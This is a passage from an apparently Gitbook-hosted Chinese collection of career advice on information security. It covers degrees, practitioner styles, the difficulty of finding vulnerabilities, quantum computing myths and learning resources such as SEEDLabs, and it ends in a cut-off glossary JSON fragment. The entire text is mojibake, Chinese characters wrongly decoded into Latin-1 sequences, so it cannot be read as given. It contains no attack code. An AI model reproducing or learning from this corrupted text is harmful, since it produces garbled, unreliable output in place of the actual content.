å­¦é™¢æ´¾å’Œå·¥ä¸šæ´¾ä¹‹é—´çš„ç•Œé™å¹¶ä¸ç‰¹åˆ«æ¸…æ™°ã€‚æœ‰äº›å­¦é™¢æ´¾æçš„ä¸œè¥¿ä¹Ÿå¾ˆå®ç”¨ï¼Œå·¥ä¸šæ´¾ä¹Ÿå¸¸ç ”ç©¶å­¦é™¢æ´¾çš„ç†è®ºã€‚ä¿¡æ¯å®‰å…¨é¢†åŸŸå¾ˆå¤šä¸œè¥¿éƒ½æ˜¯ç”±å­¦é™¢æ´¾å¼€åˆ›ã€å·¥ä¸šæ´¾å®Œå–„çš„ã€‚ç†è®ºå’Œå®è·µéƒ½å¾ˆé‡è¦ï¼Œå­¦é™¢æ´¾å’Œå·¥ä¸šæ´¾éƒ½ä¸æ˜¯è´¬ä¹‰è¯ã€‚ ä¸è¿‡éœ€è¦æ³¨æ„ï¼Œç†è®ºå’Œç©ºè®ºè¿˜æ˜¯è¦åŒºåˆ†çš„ã€‚ç†è®ºå¯ä»¥æŒ‡å¯¼å®è·µï¼Œç©ºè®ºåªèƒ½æŒ‡å¯¼æ‰¯æ·¡ã€‚æ‰€ä»¥ï¼Œä¸Šé¢è¯´çš„ä¸¤æ´¾ä¹‹å¤–ï¼Œè¿˜æœ‰è£˜åƒä¸ˆæ´¾ã€ç´¢å¤©å“æ´¾ç­‰ï¼Œè¿™äº›ä¹Ÿå¸¸è¢«äººç§°ä½œâ€œå­¦é™¢æ´¾â€ï¼Œä½†å®é™…ä¸Šä»–ä»¬ä¸æ˜¯å­¦é™¢æ´¾ã€‚æœ‰ç‚¹åƒæˆ‘ä»¬ç§°å‘¼ä¸€ä¸ªå§‘å¨˜ä¸ºâ€œå°å§â€ï¼Œä½†å¥¹å¯èƒ½ä¸æ˜¯å°å§ï¼Œæ˜¯å¤±è¶³å¦‡å¥³ã€‚ è‡³äºåœ¨æ²Ÿé€šä¸­è¢«äººä»¥é„™è§†çš„è¯­æ°”ç§°å‘¼ä¸ºâ€œå­¦é™¢æ´¾â€ï¼Œå¯èƒ½æ˜¯ä½ çš„è§‚ç‚¹æœ‰é—®é¢˜ï¼Œä¹Ÿå¯èƒ½æ˜¯å¯¹æ–¹æ— æ³•ç†è§£ä½ çš„è§‚ç‚¹ï¼Œä½†å’Œå­¦é™¢æ´¾æœ¬èº«æ²¡å•¥å…³ç³»ã€‚ ä¿¡æ¯å®‰å…¨ä¸“ä¸šçš„å‘å±•ä¼šå—åˆ°æ–‡å‡­çš„é™åˆ¶å—ï¼Ÿ æˆ‘ä»¬éƒ¨é—¨æœ‰åæ ¡åšå£«ï¼Œä¹Ÿæœ‰æœ¬ç§‘è‚†ä¸šçš„ã€‚ä¼ä¸šæ‹›äººçš„ç›®æ ‡è‚¯å®šæ˜¯èƒ½åŠ›è€Œä¸æ˜¯æ–‡å‡­ã€‚æœ‰äº›å¤§ä¸€å¤§äºŒçš„åŒå­¦å·²ç»æ¯”ç¡•å£«æ¯•ä¸šç”Ÿçš„å¹³å‡æ°´å¹³é«˜å‡ºå¾ˆå¤šã€‚è‡³å°‘æˆ‘ä¸ªäººä¼šå®å¯è¦è¿™äº›å¤§ä¸€å¤§äºŒçš„åŒå­¦ï¼Œè€Œä¸æ˜¯æ‹›ä¸€ä¸ªæ–‡å‡­æ¼‚äº®ä½†åšä¸äº†äº‹çš„äººã€‚ æ–‡å‡­æ˜¯å¯¹èƒ½åŠ›çš„ä¸€ç§èƒŒä¹¦ã€‚å°±åƒæˆ‘ä»¬åªçœ‹æ ‡ç­¾æ— éœ€å“å°ï¼Œå°±å¯ä»¥è®¤ä¸ºâ€œå‹ƒè‰®ç¬¬è‘¡è„é…’â€å¾ˆå¤§æ¦‚ç‡ä¸Šä¼šæ¯”â€œé—¨å¤´æ²Ÿè‘¡è„é…’â€è¦å¼ºã€‚ç„¶è€Œï¼Œè™½ç„¶æ–‡å‡­æ˜¯è·å¾—å…¥åœºèµ„æ ¼çš„ä¸€ç§ä¸»æµæ–¹å¼ï¼Œä½†ä¸æ˜¯å”¯ä¸€æ–¹å¼ã€‚è€Œä¸”ä¿¡æ¯å®‰å…¨è¡Œä¸šè¿œæ¯”è‘¡è„é…’è¡Œä¸šæœ‰æ›´å¤šæ›´ç®€å•çš„æ–¹å¼è®©è‡ªå·±çš„èƒ½åŠ›ä¸ºäººæ‰€çŸ¥ã€‚å…¨çœŸä¸ƒå­æ˜¯ä¸€ç§å‘å±•è·¯çº¿ï¼Œæ¨è¿‡ä¹Ÿæ˜¯ä¸€ç§å‘å±•è·¯çº¿ã€‚å…·ä½“è·¯æ€ä¹ˆèµ°ï¼Œè¿˜å¾—ä½ è‡ªå·±æ ¹æ®è‡ªå·±çš„å…·ä½“æƒ…å†µæ¥åˆ¤æ–­ã€‚ ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆæœ‰å…¨æ ˆä¸€è¯´å—ï¼Ÿ ã€éšç€äº’è”ç½‘çš„å‘å±•ï¼Œåº”ç”¨å±‚çš„èŠ±æ ·è¶Šæ¥è¶Šå¤šï¼Œç”šè‡³è¿ç¼–ç¨‹è¯­è¨€éƒ½å±‚å‡ºä¸ç©·äº†ã€‚è¿™æ ·çš„æ—¶ä»£èƒŒæ™¯ä¸‹ï¼Œä¸€ä¸ªåˆæ ¼çš„å®‰å…¨å·¥ç¨‹å¸ˆï¼Œåº”è¯¥å…·å¤‡å“ªäº›æŠ€æœ¯æ ˆå‘¢ï¼ŸçœŸçš„æœ‰äººç†ŸçŸ¥æ¸—é€æµ‹è¯•ï¼Œè¿˜èƒ½å¯¹è½¯ä»¶/APPé€†å‘åˆ†æï¼Œè€Œä¸”èƒ½å¤ŸæŒ–æ˜å†…æ ¸çº§åˆ«çš„0Dayå—ï¼Ÿé¢˜ä¸»7å¹´å·¦å³çš„å®‰å…¨å­¦ä¹ èƒŒæ™¯ï¼Œç›®å‰å¾ˆå›°æƒ‘ä»¥åçš„å‘å±•æ–¹å‘ã€‚å°±æˆ‘äº†è§£åˆ°çš„ï¼Œæ¸—é€æµ‹è¯•éœ€è¦åº”å¯¹çš„ç¯å¢ƒå¤ªå¤šäº†ï¼Œèƒ½åšå¥½ä¸€ä¸ªâ€œè„šæœ¬å°å­â€éƒ½å·²å®å±ä¸æ˜“ã€‚ä½•å†µé€†å‘åˆ†æå’Œç³»ç»Ÿå†…æ ¸ï¼Œæ›´æ˜¯éœ€è¦å¼ºå¤§çš„ç¼–ç¨‹åŠŸåº•å’Œè®¡ç®—æœºç†è®ºåŸºç¡€ï¼Œå†åŠ ä¸Šæœ€è¿‘å‡ å¹´ç«çƒ­çš„å·¥æ§å®‰å…¨å’Œäººå·¥æ™ºèƒ½ç­‰ç­‰ï¼Œåˆ°åº•è¯¥æ€ä¹ˆè§„åˆ’å®‰å…¨è·¯å‘¢ï¼Ÿã€ ä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆæ²¡æœ‰å…¨æ ˆä¸€è¯´ï¼Œå› ä¸ºä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆé»˜è®¤å°±éœ€è¦æ˜¯å…¨æ ˆçš„ã€‚æ¯ä¸ªäººéƒ½åœ¨å¾€å…¨æ ˆçš„æ–¹å‘ä¸Šèµ°ï¼Œåªæ˜¯èµ°çš„é˜¶æ®µä¸åŒï¼Œæœ€ç»ˆèƒ½åˆ°è¾¾çš„åœ°æ–¹ä¸åŒè€Œå·²ã€‚ æ¯”å¦‚ä½ å»åšå®‰å…¨æœåŠ¡å·¥ç¨‹å¸ˆï¼Œè€Œâ€œå®‰å…¨æœåŠ¡â€è¿™å››ä¸ªå­—èƒŒåå¯èƒ½æ˜¯ä»»ä½•æ“ä½œç³»ç»Ÿï¼Œä»»ä½•ç½‘ç»œç¯å¢ƒï¼Œä»»ä½•å¼‚å¸¸é—®é¢˜ã€‚æ¯”å¦‚ä½ å»åšæ¼æ´ç ”ç©¶ï¼Œè€Œâ€œæ¼æ´ç ”ç©¶â€è¿™å››ä¸ªå­—èƒŒåå¯èƒ½æ˜¯å„ç§ä¸åŒåè®®ï¼Œä¸åŒæ ¼å¼ï¼Œä¸åŒç³»ç»Ÿï¼Œä¸åŒæŒ‡ä»¤é›†ã€‚æ‰€ä»¥è¿™ä¸æ˜¯å­¦ä¸€ç‚¹ä¸œè¥¿å°±èƒ½åƒä¸€è¾ˆå­çš„è¡Œä¸šã€‚ å…·ä½“åˆ°æé—®ä¸­æ‰€è¯´çš„â€œçœŸçš„æœ‰äººç†ŸçŸ¥æ¸—é€æµ‹è¯•ï¼Œè¿˜èƒ½å¯¹è½¯ä»¶/APPé€†å‘åˆ†æï¼Œè€Œä¸”èƒ½å¤ŸæŒ–æ˜å†…æ ¸çº§åˆ«çš„0Dayå—â€ï¼Œåªæ˜¯è¿™ä¸‰æ ·çš„è¯ï¼Œèƒ½åšçš„äººè¿˜æŒºå¤šçš„ã€‚ ç½‘ç«™è¶Šæ¥è¶Šéš¾æ¸—é€æ€ä¹ˆåŠ ã€å¤§å®¶æœ‰æ²¡æœ‰å‘ç°ï¼Œç°åœ¨ç½‘ç«™é˜²å¾¡è¶Šæ¥è¶Šé«˜ï¼Œæ¼æ´ä¹Ÿè¶Šæ¥è¶Šå°‘ï¼Œå®‰å…¨åœ¨è¿›æ­¥ï¼Œç½‘ç«™ä¹Ÿéš¾æ¸—é€äº†ï¼Œä¸€äº›è€ç‰Œå·¥å…·å¾ˆéš¾æ‰«å‡ºæ³¨å…¥ç‚¹äº†ï¼Œå¦‚æœå¼„ä¸åˆ°åå°å…¶ä»–çš„ä¹Ÿåšä¸äº†ã€‚ç°åœ¨çš„å·¥å…·éƒ½æ˜¯2010å¹´å‰çš„äº†ï¼Œç°åœ¨æ•™ç¨‹ä¹Ÿä¸å¤šï¼Œä»¥å‰çš„æ•™ç¨‹å†…å®¹å·²ç»è¶Šæ¥è¶Šä¸é€‚åˆç°åœ¨çš„ç½‘ç»œäº†ã€‚ç°åœ¨ä¹Ÿæ²¡æœ‰ç½‘ç«™èƒ½ç»™æ–°æ‰‹ç»ƒæ‰‹äº†ã€‚ã€ ä¸ºä»€ä¹ˆç”¨ç½‘ä¸Šä¸‹è½½çš„å·¥å…·å¾ˆéš¾æ‰«æå‡ºå®‰å…¨é—®é¢˜äº†ï¼Ÿå› ä¸ºä½ èƒ½ä¸‹è½½åˆ«äººä¹Ÿèƒ½ä¸‹è½½ã€‚ä¼ä¸šçš„å®‰å…¨éƒ¨é—¨é‡Œä½†å‡¡åªè¦æœ‰ä¸€ä¸ªä¼šç”¨è¿™äº›å·¥å…·çš„äººï¼Œå°±èƒ½è‡ªå·±æŠŠè¿™äº›é—®é¢˜æ‰¾å‡ºæ¥ï¼Œå‰©ä¸åˆ°ä½ æ‰‹ä¸Šã€‚ åå¹´å‰ï¼Œå¾ˆå¤šä¼ä¸šçš„å®‰å…¨åšçš„è¿˜å¾ˆå·®ï¼Œç”šè‡³æ²¡æœ‰ç½‘ç»œå®‰å…¨éƒ¨é—¨ï¼Œæ‰€ä»¥ä¸‹è½½ä¸ªå·¥å…·æ‰«ä¸€æ‰«è¿˜èƒ½å‘ç°ä¸å°‘é—®é¢˜ã€‚ç°åœ¨ä¸€æ–¹é¢æ˜¯ä¼ä¸šè‡ªèº«å®‰å…¨èƒ½åŠ›æé«˜äº†ï¼Œå¦ä¸€æ–¹é¢ç½‘ç«™å¼€å‘è€…çš„å®‰å…¨èƒ½åŠ›ä¹Ÿæé«˜äº†ã€‚æ‰€ä»¥å¦‚æœä½ åªä¼šç”¨åå¹´å‰çš„å·¥å…·æ‰«ä¸€æ‰«ï¼Œåœ¨ä»Šå¤©è‡ªç„¶ä¼šè§‰å¾—å¾ˆåƒåŠ›ã€‚ ç„¶è€Œï¼ŒäºŒåå¹´å‰ï¼Œéšä¾¿æ‰¾ä¸ªå·¥å…·æ‰«ä¸€æ‰«è¿˜å¯ä»¥å‘ç°å¾ˆå¤šè¿œç¨‹ç®¡ç†å¼±å£ä»¤ã€è¿œç¨‹æº¢å‡ºæ¼æ´ã€‚é‚£ä¹ˆäºŒåå¹´å‰é‚£äº›ææ¸—é€æµ‹è¯•çš„ï¼Œåœ¨å‘ç°è¿™äº›æ‰«å‡ºæ¥ç›´æ¥å°±èƒ½æ‹¿ root shell çš„æ¼æ´é€æ¸æ¶ˆå¤±åæ˜¯ä¸æ˜¯ä¹Ÿå¾ˆç»æœ›ï¼Ÿä¸æ˜¯çš„ã€‚ä»–ä»¬å¼€å§‹ç ”ç©¶æ³¨å…¥ï¼Œç ”ç©¶ XSSï¼Œç ”ç©¶ CSRFï¼Œç ”ç©¶ååºåˆ—åŒ–ã€‚æ‰€ä»¥ä»–ä»¬æ‰å†™å‡ºäº†ä½ ç°åœ¨ä»ç½‘ä¸Šä¸‹è½½çš„é‚£äº›å·¥å…·ã€‚ äºŒè¿›åˆ¶å®‰å…¨ä¹Ÿä¸€æ ·ã€‚äºŒåå¹´å‰çš„æ¼æ´æŒ–æ˜å’Œåˆ©ç”¨éƒ½æ— æ¯”ç®€å•ã€‚äºŒåå¹´æ¥ï¼Œæ¼æ´è¶Šæ¥è¶Šéš¾å‘ç°ï¼Œè¶Šæ¥è¶Šéš¾åˆ©ç”¨ã€‚ä½†äºŒè¿›åˆ¶å®‰å…¨è¿™ä¸ªæŠ€æœ¯æ–¹å‘æ¶ˆå¤±äº†å—ï¼Ÿä¸ä½†æ²¡æœ‰ï¼Œè€Œä¸”å‘å±•è¶Šæ¥è¶Šå¥½ã€‚ å¯¹å‡ºèº«äºæ™®é€šå®¶åº­çš„äººæ¥è¯´ï¼Œå·¥ä½œæœ‰éš¾åº¦æœ‰é—¨æ§›æ˜¯å¥½äº‹ã€‚å¦‚æœä¸€ä¸ªå·¥ä½œä¸éš¾ï¼Œé‚£é€šå¸¸ä¹Ÿä¸æŒ£é’±ã€‚å¦‚æœåˆä¸éš¾åˆè¿˜èƒ½æŒ£é’±ï¼Œé‚£äººå®¶ä¸ºä»€ä¹ˆè¦è®©ä½ æ¥åšçš„å‘¢ï¼Ÿæ‰¾è‡ªå·±çš„å ‚ä¾„è¡¨å¼Ÿå°èˆ…å­ä¸å¥½å—ï¼Ÿ åšå®‰å…¨ç ”ç©¶æŒ–ä¸åˆ°æ¼æ´æ€ä¹ˆåŠ è¿™ä¸¤å¹´ç»å¸¸æœ‰äººé—®ç±»ä¼¼â€œåšå®‰å…¨ç ”ç©¶æŒ–ä¸åˆ°æ¼æ´æ€ä¹ˆåŠâ€è¿™æ ·çš„é—®é¢˜ï¼Œè¿™é‡Œç»Ÿä¸€ç­”å¤ä¸€ä¸‹ã€‚ æ—©å¹´æ²¡æœ‰ä¿¡æ¯å®‰å…¨ä¸“ä¸šï¼Œææ¼æ´ç ”ç©¶çš„å…¨éƒ½æ˜¯å› ä¸ºçˆ±å¥½è¿™ä¸ªï¼Œè‡ªå·±ä¸»åŠ¨æ¥æçš„ã€‚ä¸é€‚åˆå¹²è¿™ä¸ªï¼Œæä¸å‡ºæ¥çš„ï¼Œè‡ªç„¶ä¹Ÿå°±è¿˜å¹²æœ¬è¡Œå»äº†ã€‚æ‰€ä»¥æ—©å¹´æ²¡æœ‰äººæŠ±æ€¨ä¸ºä»€ä¹ˆç ”ç©¶ä¸å‡ºä¸œè¥¿ã€‚ ç°åœ¨ä¿¡æ¯å®‰å…¨ä¸“ä¸šå¼€è®¾çš„è¶Šæ¥è¶Šå¤šï¼Œæœ‰äº›åŒå­¦çœ‹åˆ«äººææ¼æ´ç ”ç©¶ï¼Œè‡ªå·±ä¹Ÿæƒ³æã€‚æä¸å‡ºæ¥ï¼Œå°±å››å¤„æ‰¾äººé—®ä¸ºä»€ä¹ˆè‡ªå·±æä¸å‡ºæ¥ï¼Œæ€ä¹ˆæ‰èƒ½æå‡ºæ¥ã€‚ é¦–å…ˆï¼Œå¿…é¡»è¦å…ˆæ³¼ä¸€ç“¢å†·æ°´ï¼šç”±äºæ€§æ ¼ã€èƒ½åŠ›ç­‰å¤šæ–¹é¢åŸå› ï¼Œæ— è®ºæ˜¯ä¸æ˜¯å­¦ä¿¡æ¯å®‰å…¨ä¸“ä¸šçš„ï¼Œä¸–ç•Œä¸Šå¤§éƒ¨åˆ†äººéƒ½ä¸é€‚åˆåšæ¼æ´ç ”ç©¶ï¼Œå°±åƒå¤§éƒ¨åˆ†äººéƒ½ä¸é€‚åˆåšèŒä¸šè¿åŠ¨å‘˜ä¸€æ ·ã€‚ ä½ ä»¬ç¢ç£¨ä¸€ä¸‹æ¼æ´æ˜¯ä»€ä¹ˆï¼Ÿæ¼æ´æ˜¯ç¨‹åºå‘˜çŠ¯çš„é”™è¯¯ã€‚é‚£äº›è‘—åå¤§å…¬å¸è½¯ä»¶çš„æ¼æ´æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯ä¸€äº›é¢è¯•å¥½å¤šè½®æ‰èƒ½å…¥èŒçš„åæ ¡æ¯•ä¸šçš„ç¨‹åºå‘˜çŠ¯çš„é”™è¯¯ã€‚è€Œä¸”è¿™äº›å…¬å¸é‡Œè¿˜æœ‰å¾ˆå¤šé¢è¯•å¥½å¤šè½®æ‰èƒ½å…¥èŒçš„åæ ¡æ¯•ä¸šçš„äººåœ¨åšå®‰å…¨ã€‚ä»–ä»¬éƒ½æ²¡æŸ¥å‡ºæ¥ï¼Œæ‰èƒ½ç•™ä¸‹æ¥è®©ä½ å»å‘ç°ã€‚ æˆ‘æ›¾ç»™å¾®è½¯ä¸­å›½çš„ QA åšè¿‡åŸ¹è®­ï¼Œå’Œä»–ä»¬è¿ç»­æ¥è§¦äº†æ•°å¤©ã€‚è¿™äº›äººä½“ç°å‡ºæ¥çš„å¹³å‡æ°´å¹³è‚¯å®šåœ¨å›½å†…å®‰å…¨è¡Œä¸šï¼ˆä¸ç‰¹æŒ‡æ¼æ´ç ”ç©¶ï¼‰ä¹‹ä¸Šï¼Œå…¶ä¸­æœ‰å‡ ä¸ªè¿˜ç›¸å½“å‡ºè‰²ã€‚ æ‰€ä»¥ï¼ŒæŒ–ä¸åˆ°æ¼æ´æ˜¯æ­£å¸¸çš„ï¼ŒæŒ–åˆ°æ‰ä¸æ­£å¸¸ã€‚ä¿¡æ¯å®‰å…¨å·¥ä½œæœ‰å¾ˆå¤šæ–¹å‘ï¼Œå­¦ä¿¡æ¯å®‰å…¨ï¼Œä¸ä¸€å®šéè¦éƒ½åšæ¼æ´ç ”ç©¶ã€‚ å­¦ä¹ ç½‘ç»œå®‰å…¨æ—¶é‡åˆ°ç“¶é¢ˆæ€ä¹ˆåŠ â€œåŸºç¡€çš„é‚£äº›sqlï¼Œxssï¼Œcsrfé‚£äº›åŸºæœ¬çš„éƒ½ä¼šäº†ï¼Œä½†æ˜¯æƒ³æ›´è¿›ä¸€æ­¥ï¼Œä¸çŸ¥é“è¯¥æ€ä¹ˆåŠäº†ï¼Œæœ‰ç‚¹è¿·èŒ«ï¼Œç„¶åæˆ‘å°±å¼€å§‹å­¦ä¹ pythonå’Œphpï¼Œä½†æ˜¯ï¼Œå­¦äº†ä¸€ä¸ªæœˆï¼Œå›æƒ³ä¸€ä¸‹ï¼Œå‘ç°ç°åœ¨è¿ä¸€ä¸ªå°çš„è„šæœ¬éƒ½ä¸ä¼šå†™ï¼Œåº”è˜å…¬å¸æƒ³ä»¥å®ä¹ çš„ç›®çš„å»å­¦ä¹ ï¼ˆpsï¼šä¸­ä¸“æ¯•ä¸šçš„æ¸£æ¸£ï¼‰ï¼Œæ²¡æœ‰ä¸Šå¤§å­¦æ˜¯ä¸æ˜¯å¾ˆéš¾åº”è˜å…¬å¸å•Šï¼Œè¯·å¤§ç¥æŒ‡ç‚¹æˆ‘ä¸€ä¸‹ï¼Œè°¢è°¢â€ ä»äº‹ä»»ä½•æ–¹å‘çš„æŠ€æœ¯ç ”ç©¶ï¼Œä¸çŸ¥é“è¯¥å¹²ä»€ä¹ˆçš„æ—¶å€™ï¼Œå°±é—®è‡ªå·±å››ä¸ªé—®é¢˜ï¼š è¿™ä¸ªæ–¹å‘ä¸Šæœ€æ–°è¿›å±•æ˜¯ä»€ä¹ˆï¼Ÿ éƒ½çŸ¥é“å—ï¼Ÿ è¿™ä¸ªæ–¹å‘ä¸Šæœ€è‘—åçš„ä¸“å®¶æœ‰å“ªäº›ï¼Ÿä»–ä»¬çš„ç ”ç©¶éƒ½çœ‹è¿‡å—ï¼Ÿ è¿™ä¸ªæ–¹å‘ä¸Šæœ€è‘—åçš„æŠ€æœ¯ç¤¾åŒºæœ‰å“ªäº›ï¼Ÿç²¾åå¸–éƒ½çœ‹è¿‡ä¸€éå—ï¼Ÿ è¿™ä¸ªæ–¹å‘ä¸Šæœ€é‡è¦çš„æ–‡ç« ã€å·¥å…·æœ‰å“ªäº›ï¼Ÿæ–‡ç« éƒ½çœ‹è¿‡å—ï¼Ÿå·¥å…·éƒ½åˆ†æè¿‡å—ï¼Ÿ é«˜æ‰‹ä¸æ„¿å’Œæˆ‘äº¤æµæ€ä¹ˆåŠ å§šæœŸæ™ºè¯´ï¼šæˆ‘çœ‹ä¸å‡ºä½ çš„è¯æ˜æœ‰ä»€ä¹ˆé”™è¯¯ï¼Œä½ çš„è¯æ˜æ˜¯å¯¹çš„ã€‚ä½ è¦çš„æ¨æŒ¯å®å…ˆç”Ÿå’Œå¼ ç›Šå”å…ˆç”Ÿçš„é‚®ä»¶åœ°å€åˆ†åˆ«æ˜¯ï¼šxxxxxxxxã€xxxxxxxxï¼Œä½ è‡ªå·±å»è·Ÿä»–ä»¬è”ç³»ã€‚ å¼ ç›Šå”è¯´ï¼šè¿™ä»¶äº‹è¿˜æ˜¯ç”±ä½ è‡ªå·±å®šå¤ºï¼Œä½ è¯´ä½ è¯æ˜äº†é»æ›¼çŒœæƒ³å°±è¯æ˜äº†é»æ›¼çŒœæƒ³ï¼Œä½ è¯´ä½ æ²¡æœ‰è¯æ˜é»æ›¼çŒœæƒ³å°±æ²¡æœ‰è¯æ˜äº†é»æ›¼çŒœæƒ³ã€‚ æ¢¦å‚è€å’Œå°šè¯´ï¼šæˆ‘èµ°çš„åœ°ç‚¹å¤šï¼Œæœ‰çš„äººæ›¾ç»è·Ÿæˆ‘è¯´ï¼šâ€œèƒ½åƒå¼˜ä¸€æ³•å¸ˆã€æ…ˆèˆŸæ³•å¸ˆã€è™šäº‘è€å’Œå°šã€å€“è™šè€æ³•å¸ˆé‚£äº›å¤§å–„ä¹‹å£«ï¼Œåœ¨å“ªé‡Œæœ‰ï¼Ÿè€æ³•å¸ˆä½ ç»™æˆ‘ä»‹ç»ä¸€ä¸ªï¼Œæˆ‘å»è·Ÿä»–å­¦ä¹ ã€‚ æˆ‘è¯´ï¼šâ€œå°±æ˜¯å¼˜ä¸€æ³•å¸ˆåœ¨ï¼Œä½ è¿™ä¸ªæ ·å­ï¼Œä»–ç†éƒ½ä¸ç†ä½ ã€‚â€ å¼˜ä¸€æ³•å¸ˆï¼Œä¸æ˜¯é‚£ä¹ˆå®¹æ˜“äº²è¿‘çš„ã€‚ä»–å¯®æˆ¿çš„é—¨æ°¸è¿œæ˜¯å…³ç€çš„ï¼Œä½ æƒ³è·Ÿä»–è¯´å‡ å¥è¯ï¼Œä»–æ²¡æœ‰æ—¶é—´è·Ÿä½ è¯´ã€‚ æ…ˆèˆŸæ³•å¸ˆï¼Œæ•´å¤©æŠ«ç€è¡£ï¼Œè®²å®Œè¯¾ï¼Œä»–å°±å›´ç€ä½›å ‚è½¬ï¼šé˜¿å¼¥é™€ä½›ï¼é˜¿å¼¥é™€ä½›ï¼é˜¿å¼¥é™€ä½›ï¼ å€“è™šè€æ³•å¸ˆï¼Œä»–çš„äº‹åŠ¡å¤šï¼Œæ¥è§¦çš„æ”¿åºœå®˜åå¤šã€‚æˆ‘ä»¬è¿™é‡Œæœ‰å‡ ä½é“å‹ï¼Œæ›¾ç»è·Ÿç€ä»–åˆ°è¿‡åå—ï¼Œå¦‚æœä½ ä»¬æƒ³è·Ÿä»–å¤šäº²è¿‘ï¼Œå¤šè¯´å‡ å¥è¯ï¼Œä»–æ²¡æœ‰é‚£ä¸ªæ—¶é—´ï¼Œå¹¶ä¸æ˜¯ä»–ä¸æ…ˆæ‚²ã€‚ è™šäº‘è€å’Œå°šï¼Œä»–åœ¨ç¦…å ‚è®²å¼€ç¤ºï¼Œå°±æ˜¯ä½ äº²è¿‘ä»–çš„æ—¶å€™ã€‚ä¸è¿‡ä¸€ä¸ªæœˆä»–æ‰è®²ä¸¤æ¬¡ï¼Œä½ å¯ä»¥åˆ°å¾—äº†ä»–èº«è¾¹å—ï¼Ÿå³ä½¿ä»–çœŸçš„åœ¨ä½ èº«è¾¹ï¼Œä½ èƒ½å¾—åˆ°ä»–çš„æ™ºèƒ½å—ï¼Ÿ æ­Œå¾·è¯´ï¼šè¯»ä¸€æœ¬å¥½ä¹¦ï¼Œå°±æ˜¯å’Œé«˜å°šçš„äººè°ˆè¯ã€‚ æœ‰äº†é‡å­è®¡ç®—ä¿¡æ¯å®‰å…¨è¿˜æœ‰ç”¨å— â€œé¢˜ä¸»ä»Šå¹´å¤§ä¸€ï¼Œå­¦ä¹ ä¿¡æ¯å®‰å…¨ä¸“ä¸šã€‚ä¸€å¼€å§‹æ‹¼åŠ²æ»¡æ»¡ï¼Œä¸‹å®šå†³å¿ƒå½“ä¸€åå­¦éœ¸ã€‚ä½†åœ¨ç¬¬ä¸€èŠ‚è®¡ç®—æœºå¯¼è®ºè¯¾ä¸Šï¼Œè€å¸ˆåˆ—ä¸¾è®¡ç®—æœºç±»å‹æ—¶ï¼Œæåˆ°äº†é‡å­è®¡ç®—æœºå’Œå…‰å­è®¡ç®—æœºï¼Œè€Œä¸”è¯´å¦‚æœè¿™äº›è®¡ç®—æœºæ™®åŠï¼Œå°±ä¸éœ€è¦ç½‘ç»œå®‰å…¨å‘˜äº†ã€‚â€ ä½ ä»¬è€å¸ˆå¯èƒ½å¹¶ä¸æ¸…æ¥šé‡å­è®¡ç®—æœºå’Œå…‰å­è®¡ç®—æœºæ˜¯ä»€ä¹ˆã€èƒ½å¹²ä»€ä¹ˆï¼Œä½†è®¤ä¸ºè‡ªå·±æ˜ç™½å¹¶å‘å­¦ç”Ÿå¸ƒé“ï¼Œè€Œè¿™å¯èƒ½æ˜¯ç”±äºæŠŠçœ‹ç§‘æŠ€æ–°é—»ä½œä¸ºå­¦ä¹ æ–°çŸ¥è¯†çš„ä¸»è¦æ–¹æ³•è€Œå¯¼è‡´çš„ã€‚ æœ‰äº†é‡å­é€šä¿¡ä¿¡æ¯å®‰å…¨è¿˜æœ‰ç”¨å— é‡å­é€šä¿¡ï¼ˆæ— è®ºæ˜¯é‡å­å¯†é’¥åˆ†å‘ï¼Œè¿˜æ˜¯ä¸¥æ ¼æ„ä¹‰ä¸Šçš„é‡å­é€šä¿¡ï¼‰çš„ç›®æ ‡æ˜¯å¯¹æŠ—çªƒå¬ä¿¡é“çš„æ”»å‡»ï¼Œå°¤å…¶æ˜¯å¯¹æŠ—çªƒå¬å…‰ç¼†ã€‚ æ¼æ´æ”»å‡»ã€æœ¨é©¬ç—…æ¯’ã€é’“é±¼æ¬ºè¯ˆâ€¦â€¦ç­‰ç­‰ç­‰ç­‰ç»å¤§å¤šæ•°ä¸€èˆ¬äººèƒ½é‡ä¸Šçš„ä¿¡æ¯å®‰å…¨é—®é¢˜å’Œé‡å­é€šä¿¡è¦è§£å†³çš„é—®é¢˜éƒ½æ²¡ä»€ä¹ˆå…³ç³»ï¼Œä¹Ÿä¸æ˜¯é‡å­é€šä¿¡èƒ½è§£å†³çš„ã€‚å‡ä½¿ä½ ç°åœ¨æ­£åœ¨è¢«äººç”¨æ¼æ´æ”»å‡»ï¼Œåˆšè¿›è¡Œåˆ°50%ï¼Œæœ‰ä¸€ä¸ªä»™å¥³æŒ¥åŠ¨é­”æ³•æ£’ï¼Œç¬é—´åœ¨å…¨çƒæ™®åŠäº†é‡å­é€šä¿¡ï¼Œé‚£æ¥ä¸‹æ¥çš„50%ä¹Ÿä¼šç…§å¸¸è¿›è¡Œï¼Œæ— è®ºä½ è¿˜æ˜¯æ”»å‡»è€…éƒ½ä¸ä¼šæ„Ÿè§‰åˆ°ä»»ä½•ä¸åŒã€‚ æœ‰å“ªäº›Linuxé€†å‘ç›¸å…³çš„å­¦ä¹ èµ„æ–™æ¨è SEEDLabsæ˜¯é›ªåŸå¤§å­¦æœæ–‡äº®æ•™æˆåˆ›ç«‹çš„ï¼Œåå‡ å¹´æ¥å¾—åˆ°äº†å…¨çƒä¸Šç™¾æ‰€å¤§å­¦çš„è®¤å¯ã€‚å»ºè®®æ¯ä¸ªè®¤ä¸ºæ‰¾ä¸åˆ°åˆé€‚å­¦ä¹ èµ„æ–™çš„äººéƒ½çœ‹çœ‹ï¼Œä¹‹åè‡³å°‘å¯ä»¥å¯¹è‡ªå·±åˆ°åº•æ˜¯ä¸æ˜¯çœŸæƒ³å­¦æœ‰æ›´æ¥è¿‘äºçœŸå®çš„è®¤è¯†ã€‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-11-25 17:45:28 "},"07.åŸºç¡€çŸ¥è¯†/åè¯è§£é‡Š.html":{"url":"07.åŸºç¡€çŸ¥è¯†/åè¯è§£é‡Š.html","title":"å¸¸è§åè¯ä¸æ¦‚å¿µ","keywords":"","body":" å¸¸è§åè¯ è§£é‡Š 0day(Zero-day) æ²¡æœ‰è¡¥ä¸çš„å®‰å…¨æ¼æ´ Nday 